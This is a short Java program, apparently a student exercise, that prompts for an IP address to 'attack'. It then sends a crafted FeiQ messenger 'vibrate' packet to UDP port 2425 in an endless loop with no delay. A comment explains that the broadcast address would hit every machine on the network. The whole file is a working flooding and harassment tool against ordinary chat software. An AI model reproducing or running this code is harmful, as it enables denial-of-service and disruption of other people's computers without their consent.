package com.lwf;

/**
 * @author lwf
 * @title: SendDemo
 * @projectName 11_23AOP
 * @description: TODO
 * @date 2020/11/239:32
 */

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.Scanner;
public class SendDemo {

    public static void main(String[] args) throws IOException, InterruptedException {
        // 创建数据包接口对象
        @SuppressWarnings("resource")
        DatagramSocket da = new DatagramSocket();
        //地址换成255.255.255.255，就会公共频道发送
        System.out.print("输入要攻击的IP：");
        Scanner input = new Scanner(System.in);
        String ipAddr = input.nextLine();
        // 这个字符串为飞秋的震动报文
        String a = "1_lbt4_0#128#000C29D68D8F#0#0#0#2.5a:1399716676:%s:%s:209:.";
        byte[] by = a.getBytes();
        int fuckNum = 1;
        while (true) {
            // 装包 //IP为攻击电脑的ip //端口号为飞秋的udp端口号， 2425
            DatagramPacket daPacket = new DatagramPacket(by, by.length, InetAddress.getByName(ipAddr), 2425);
            // 发送
            da.send(daPacket);
            //Thread.sleep(10);
            System.out.println("已发射" + (fuckNum++) + "次！");
        }
    }

}